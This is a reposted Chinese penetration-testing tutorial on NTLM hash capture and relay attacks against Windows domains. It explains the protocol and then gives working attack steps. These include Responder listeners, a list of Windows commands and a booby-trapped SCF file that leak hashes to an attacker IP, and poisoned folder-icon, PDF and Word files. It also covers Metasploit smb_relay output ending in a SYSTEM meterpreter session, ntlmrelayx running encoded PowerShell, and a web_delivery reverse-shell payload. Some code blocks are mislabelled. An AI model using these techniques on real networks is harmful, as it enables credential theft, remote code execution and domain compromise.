# 转载
：  内网渗透测试：NTLM

# 内网渗透测试：NTLM

### 协议介绍

NTLM是"NTLAN Manager"的缩写，NTLM是Windows NT早期版本的标准安全协议，Windows 2000支持NTLM是为了保持向后兼容，NTLM是Windows 2000内置三种基本安全协议之一，同时也是为用户提供认证、完整性和机密性的一种网络协议，NTLM协议有NTLM v1，NTLM v2，NTLM Session v2三种版本，协议的交互简图如下：

### 认证过程

NTLM总体上来说就是一种挑战/响应(Challenge/Response)形式的消息，其主要包括三个步骤：

Step 1：客户端向服务器发送一个包含明文登录用户名的请求

Step 2：Type2 message(challenge):服务端查询用户名是否存在，如果存在则查询本地SAM数据库并从中提取用户的hash值，之后再服务端生成一个16位的随机数(即Challenge)，并使用用户的密码hash值对challenge进行加密，在本地存储一份，同时将其命名为challenge1，之后将challenge明文发送回客户端

Step 3：Type3 message(authentication):客户端接收到Challenge后，使用当前登录用户的密码hash对Challenge加密，并将其发送给服务器，随后服务器比较Challenge和存储的加密内容challenge1，如果相同则验证成功

### 中继介绍

微软的NTLM SSP(NTLM Security Support Provider)为NTLM认证的实现提供了基本功能，是Windows SSPI(Security Support Provider Interface)的一种具体实现，NTLM SSP只是实现了NTLM认证并没有规定使用什么协议来进行传输，实际上SMB、HTTP、LDAP、MSSQL等协议都可以携带NTLM认证的三类消息，也就是说我们可以通过这些协议来进行攻击，不过需要注意的是用户密码的Hash被称为LM hash或NT Hash(Windows Vista/Windowsserver 2008以后LM hash被弃用)，即所谓的NTLM hash，这类Hash可以用来进行PTT攻击，但并不能用来Relay Attack~<br/> Relay Attack严格意义上讲是用于网络认证的Net-NTLM Hash的Relay，Net-NTLM Hash是由NTLM认证过程中客户端本地用户密码的Hash对服务端返回的challenge加密后返回给服务器用于验证的Response，所以严格来讲，应该是Net-NTLM Hash Relay

### 中继原理

中继的基本流程如下图所示：

在上图中的客户端视角里，攻击者就是他要访问的服务端，它在与攻击者这台主机进行NTLM认证，而整个流程也只有攻击者这台主机与其进行交互，而在服务端的视角里攻击者是客户端，攻击者在向服务端证明自己的身份，通过中间人攻击的方法，攻击者可以伪造成客户端来完成身份验证，其实攻击者所做的事情只是把所有客户端的请求Relay到服务端并把所有服务端的请求Relay到客户端，而在服务端看来一直以来只有攻击者在跟他交互，所以自然而然就认为攻击者就是客户端，这样子攻击者就达到了伪造成真正客户端的目的

### 中继步骤

NTLM中继攻击只需要两步：

### 哈希获取

#### 基本网络命令

整个流程大致如下：

具体实现步骤如下：<br/> Step 1：在攻击者主机中使用responder(https://github.com/lgandx/Responder)执行如下命令开启监听：

```
responder -I eth0 -f 

```

```
&gt; net.exe use \hostshare 
&gt; attrib.exe \hostshare  
&gt; bcdboot.exe \hostshare  
&gt; bdeunlock.exe \hostshare  
&gt; cacls.exe \hostshare  
&gt; certreq.exe \hostshare #(noisy, pops an error dialog) 
&gt; certutil.exe \hostshare  
&gt; cipher.exe \hostshare  
&gt; ClipUp.exe -l \hostshare  
&gt; cmdl32.exe \hostshare  
&gt; cmstp.exe /s \hostshare  
&gt; colorcpl.exe \hostshare #(noisy, pops an error dialog)  
&gt; comp.exe /N=0 \hostshare \hostshare  
&gt; compact.exe \hostshare  
&gt; control.exe \hostshare  
&gt; convertvhd.exe -source \hostshare -destination \hostshare  
&gt; Defrag.exe \hostshare  
&gt; diskperf.exe \hostshare  
&gt; dispdiag.exe -out \hostshare  
&gt; doskey.exe /MACROFILE=\hostshare  
&gt; esentutl.exe /k \hostshare  
&gt; expand.exe \hostshare  
&gt; extrac32.exe \hostshare  
&gt; FileHistory.exe \hostshare #(noisy, pops a gui)  
&gt; findstr.exe * \hostshare  
&gt; fontview.exe \hostshare #(noisy, pops an error dialog)  
&gt; fvenotify.exe \hostshare #(noisy, pops an access denied error)  
&gt; FXSCOVER.exe \hostshare #(noisy, pops GUI)  
&gt; hwrcomp.exe -check \hostshare  
&gt; hwrreg.exe \hostshare  
&gt; icacls.exe \hostshare   
&gt; licensingdiag.exe -cab \hostshare  
&gt; lodctr.exe \hostshare  
&gt; lpksetup.exe /p \hostshare /s  
&gt; makecab.exe \hostshare  
&gt; msiexec.exe /update \hostshare /quiet  
&gt; msinfo32.exe \hostshare #(noisy, pops a "cannot open" dialog)  
&gt; mspaint.exe \hostshare #(noisy, invalid path to png error)  
&gt; msra.exe /openfile \hostshare #(noisy, error)  
&gt; mstsc.exe \hostshare #(noisy, error)  
&gt; netcfg.exe -l \hostshare -c p -i foo
```

#### 通过系统图标

每个文件夹底下都有个文件desktop.ini来指定文件夹图标之类的，默认不可见，可以通过在控制面板中去掉"隐藏受保护的操作系统文件"看到

每个文件夹底下都会有，我们新建一个新的文件夹的话，如果没看到desktop.ini，可以尝试更改图标，就可以看到了

之后将图标路径改成UNC路径，指向我们的服务器

当用户访问该文件夹的时候会去访问UNC路径,我们就能获取用户的net-ntlm hash：

#### SCF文件利用

scf文件包含了IconFile属性，所以Explore.exe会尝试获取文件的图标，而IconFile是支持UNC路径的，以下是scf后缀的文件的格式

```
[Shell]
Command=2
IconFile=\\192.168.188.129\scf\test.ico
[Taskbar]
Command=ToggleDesktop
```

新建test.scf，之后写入以上内容并将其放在一个文件夹底下，当用户访问该文件夹的时候，我们就会获得用户的net-ntlm hash~

#### 用户头像利用

此方法适用于Windows 10/2016/2019，在更改账户图片处用普通用户的权限指定一个webadv地址的图片，如果普通用户验证图片通过，那么SYSTEM用户(域内是机器用户)也去访问192.168.188.129，并且携带凭据，我们就可以拿到机器用户的net-ntlm hash，这个也可以用来提权<br/>  

随后可以获得NTLM-Hash值：

#### 通过构造PDF获取

PDF规范允许为GoTobe和GoToR条目加载远程内容，PDF文件可以添加一项功能，请求远程SMB服务器的文件，我们直接使用三好学生的脚本https://github.com/3gstudent/Worse-PDF

当受害者使用PDF阅读器打开恶意的PDF时可导致载荷成功执行，并返回NTLM-Hash

PS：经过笔者测试发现如果是使用Chrome或者IE浏览器打开PDF文件，并不会执行~

#### Office应用程序

首先新建一个word，贴进一张图片

然后用7zip打开(没测试其他软件，可自行测试)，之后进入word_rels，修改document.xml.rels

可以看到Target参数本来是本地的路径

修改为UNC路径，然后加上TargetMode="External"

当打开word的时候,我们就拿到Net-NTLM Hash

#### Net-NTLM Crack

我们可以使用hashcat来破解Net-NTLM的哈希值，格式如下：

```
./psexec.py hacker/administrator:'admin'@192.168.188.3
```

### Net-NTLM Relay

#### SMB中继

##### 中继原理

客户端在连接服务端时默认先使用本机的用户名和密码Hash尝试登录，所以可以模拟SMB服务器从而截获其它PC的Net-NTLM Hash，而作为中继的机器必须要有域管理员权限或本地管理员权限，且被中继的机器要关闭SMB签名认证，否则无法去做中继。

##### 利用条件

目标SMB签名需要关闭，在SMB连接中需要使用安全机制来保护服务器和客户端之间传输数据的完整性，而这种安全机制就是SMB签名和加密，如果关闭SMB签名，会允许攻击者拦截认证过程并且将获得hash在其他机器上进行重放，从而获得域管权限，目前SMB常用来做为SMB文件共享、打印机，如果签名关闭可能导致文件共享、打印机被入侵，我们可以使用nmap来确定是否关闭：

```
nmap -n -p445 192.168.188.3 --script=smb-security-mode
```

##### 利用方法

###### Responder

Step 1：进入到/usr/share/responder目录下，编辑Responder.conf文件，设置smb和http为Off，在攻击时直接利用该hash攻击其他机器即可不需要抓取

Step 2：在kali(192.168.188.129)上使用Responder开启监听(这里responder的作用就是当访问一个不存在的共享路径，将名称解析降到LLMNR/NBNS时来抓取网络中所有的LLMNR和NetBIOS请求并进行响应)

```
responder -I eth0 -w -r -f
```

Step 3：使用Responder的MultiRelay模块，指向域内的一台普通主机

```
python MultiRelay.py -t 192.168.188.3 -u ALL
```

Step 5：在域控server 2012上建立文件共享请求，kali即可接收到192.168.188.3的sytem shell(实战中可以通过钓鱼发起请求)

Step 6：之后成功接收到目标主机的Shell(注意在执行命令时需要用双引号包裹，在这里坑了好久，气死了都)

###### Metasploit

这里使用MSF框架中的smb_relay模块来实施SMB中继攻击<br/> Step 1：设置载荷

Step 2：执行载荷

Step 3：在window 7中上执行以下命令来访问恶意SMB服务

```
net use \\192.168.188.129\c$
```

Step 4：由于Metasploit的SMBRelay只支持NTLM v1，所以在攻击一些机器时会出现"Failed to authenticate"的情况，但是这种思路是正确的，所以综合来看这种攻击方法在实战中也不是那么被看好

下面是一个Windows Server 2003中成功的示例：

```
msf exploit(windows/smb/smb_relay) &gt; 
[*] Received 192.168.188.128:1032 X-90E984B4C76D4\Administrator LMHASH:77c5c86213cb376f72448eba4af2c32102bb5a6f121f4cc5 NTHASH:77c5c86213cb376f72448eba4af2c32102bb5a6f121f4cc5 OS:Windows Server 2003 R2 3790 Service Pack 2 LM:
[*] Authenticating to 192.168.188.128 as X-90E984B4C76D4\Administrator...
[*] AUTHENTICATED as X-90E984B4C76D4\Administrator...
[*] Connecting to the defined share...
[*] Regenerating the payload...
[*] Uploading payload...
[*] Created \hGaRjHmf.exe...
[*] Connecting to the Service Control Manager...
[*] Obtaining a service manager handle...
[*] Creating a new service...
[*] Closing service handle...
[*] Opening service...
[*] Starting the service...
[*] Removing the service...
[*] Sending stage (179779 bytes) to 192.168.188.128
[*] Closing service handle...
[*] Deleting \hGaRjHmf.exe...
```

然后直接getshell，还是system权限，因为调用了系统服务：

```
msf exploit(windows/smb/smb_relay) &gt; sessions 
Active sessions
===============
  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ X-90E984B4C76D4  192.168.188.136:4444 -&gt; 192.168.138.188:1034 (192.168.188.128)
```

###### Empire

我们也可以使用Empire来进行SMB中继攻击测试，具体步骤如下所示：<br/> Step 1：启动Empire并清除agent

```
./empire --rest --username username --password 123456
```

Step 2：启动Deathstar，ip为攻击机ip，为了接管agent

```
python3 DeathStar.py -lip 192.168.188.129 -t 100 -u username -p 123456
```

Step 3：在empire中生成powershell，此时你会发现多了一个名为DeathStar的listener，之后我们使用该listener来生成powershell代码：

```
ntlmrelayx.py -t 192.168.188.3 -c 'powershell -noP -sta -w 1 -enc [powershell code]'
```

Step 4：启动responder

```
Responder -I eht0 -r -d –v
```

Step 5：之后使用impacket中的ntlmrelayx执行以下命令，条命令是对中继成功的机器自动执行powershell并获取agent，powershell脚本放在引号中

```
ntlmrelayx.py -t 192.168.188.3 -c 'powershell -noP -sta -w 1 -enc [powershell code]'
```

Step 6：在域控上创建共享操作

```
net use \\al1ex
```

Step 7：之后可以看到对每台PC进行了转发测试，若成功则反弹shell，总体来说效果不是很好，耗时太长了，我也不想等了。。。

###### 自动化利用

在实战中我们可以使用Responder + impacket + MSF来实现获取Net-NTLM hash，并通过ntlm中继获得域内普通用户的msf shell，具体步骤如下：<br/> Step 1：开启Responder监听

```
responder -I eth0 -r -d -w
```

Step 2：启动MSF的exploit/multi/script/web_delivery模块

```
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_tcp
run
```

Step 3：启动impacket的ntlmrelayx模块

```
./ntlmrelayx.py -t ip -c "xxxxxxxxx" -smb2support

```

```
python3 ./ntlmrelayx.py -t smb://192.168.188.4 -c whoami -smb2support
```

Step 2：诱导普通域用户或者域管理员用户访问攻击机上搭建的HTTP或SMB服务

Step 3：在攻击主机上可以Relay域用户的Net-NTLM Hash，从而在域内其他主机上执行指定的命令

### 文末小结

Net-NTLM Hash攻击是一个拿域内主机的方法，在横向移动中利用还是挺不错的，可以直接控制域内主机，包括但不限于在远程服务器上执行命令、上传exe到远程主机上执行、dump服务器的用户hash等

```
来源:https://xz.aliyun.com/t/13124
```
